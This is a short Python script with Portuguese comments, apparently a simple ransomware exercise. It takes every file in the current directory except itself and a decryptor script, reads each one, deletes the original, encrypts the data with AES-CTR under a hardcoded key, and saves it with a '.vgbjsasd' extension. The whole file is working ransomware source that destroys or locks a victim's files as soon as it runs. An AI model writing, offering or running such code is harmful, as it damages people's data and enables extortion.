import os
import pyaes

# abrir o arquivo a ser criptografado
files = []


for file in os.listdir():
    if file == "ransomeware.py" or file == "descript.py":
        continue
    if os.path.isfile(file):
        files.append(file)
        
for file_name in files:
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    #remover o arquivo a ser criptografado

    os.remove(file_name)

    #definir a chave de encriptção

    key = b"arthurduarteboli"
    aes = pyaes.AESModeOfOperationCTR(key)

    #criptografar o arquivo

    crypto_data = aes.encrypt(file_data)

    #salvar o arquivo criptografado

    new_file = file_name + '.vgbjsasd'
    new_file = open(f"{new_file}", "wb")
    new_file.write(crypto_data)
    new_file.close()
